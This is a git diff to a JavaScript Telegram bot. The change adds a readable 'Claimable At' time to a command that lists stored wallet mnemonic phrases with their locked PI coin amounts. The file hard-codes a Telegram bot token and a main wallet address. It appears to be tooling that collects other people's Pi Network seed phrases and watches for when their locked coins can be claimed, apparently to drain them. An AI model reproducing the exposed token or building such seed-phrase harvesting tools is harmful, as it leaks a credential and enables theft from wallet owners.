@@ -4,6 +4,7 @@ import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
 import Sponsors from "./models/Sponsors.js";
 import Passphrase from "./models/Passphrase.js";
+import { formatReadableTimeString } from "./utils/helper.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
@@ -132,7 +133,7 @@ bot.onText(/\/listPhrs/, async (msg) => {
         }
         const phraseShort = `${p.mnemonic.slice(0, 7)}....${p.mnemonic.slice(-7)}`;
 
-        return `${index + 1}. ${phraseShort || 'Unknown'} - Locked coin: *${p.amount} PI* --_${p.status}_`;
+        return `${index + 1}. ${phraseShort || 'Unknown'} - Locked coin: *${p.amount} PI* --_${p.status}_, Claimable At ${formatReadableTimeString(p.claimableAt)}`;
     }));
     const cleanList = list.filter(Boolean);
 
